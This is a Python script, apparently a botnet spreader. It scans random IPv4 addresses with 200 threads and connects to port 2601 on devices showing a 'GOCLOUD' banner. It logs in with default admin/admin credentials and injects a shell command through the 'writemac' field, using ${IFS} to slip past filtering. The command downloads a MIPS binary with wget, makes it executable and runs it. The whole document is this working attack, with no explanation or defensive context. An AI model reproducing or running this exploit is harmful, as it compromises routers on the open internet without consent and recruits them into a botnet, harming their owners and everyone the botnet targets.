import socket
import time
import threading
import random

cmd = "cd${IFS}/tmp/;${IFS}rm${IFS}mpsl;${IFS}wget${IFS}http://ip/qqyt33.mpsl;${IFS}chmod${IFS}777${IFS}qqyt33.mpsl;${IFS}./qqyt33.mpsl${IFS}mipsel"
sequence = ['admin\n', 'admin\n', '\n', f'writemac ;{cmd};\n']


def a(ip):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, 2601))
        data = s.recv(8096)
        if 'GOCLOUD' in str(data):
            time.sleep(1)
            for seq in sequence:
                s.send(bytes(seq, 'utf-8'))
                time.sleep(1)
        print(f"Payload send  {ip}")
    except Exception as e:
        print(f"no WORKS : {ip}  [{e}]")


def random_ip_generation():
    ip1 = random.randint(0, 255)
    ip2 = random.randint(0, 255)
    ip3 = random.randint(0, 255)
    ip4 = random.randint(0, 255)
    return f"{ip1}.{ip2}.{ip3}.{ip4}"


def exploit(ip):
    a(ip)


MAX_THREADS = 200
thread_lock = threading.Lock()


def main():
    while True:
        threads = []
        with thread_lock:
            existing_threads = threading.active_count()
            if existing_threads < MAX_THREADS:
                for _ in range(MAX_THREADS - existing_threads):
                    ip = random_ip_generation()
                    t = threading.Thread(target=exploit, args=(ip, ))
                    t.start()
                    threads.append(t)

        for thread in threads:
            thread.join()

        time.sleep(0.1)


if __name__ == "__main__":
    main()
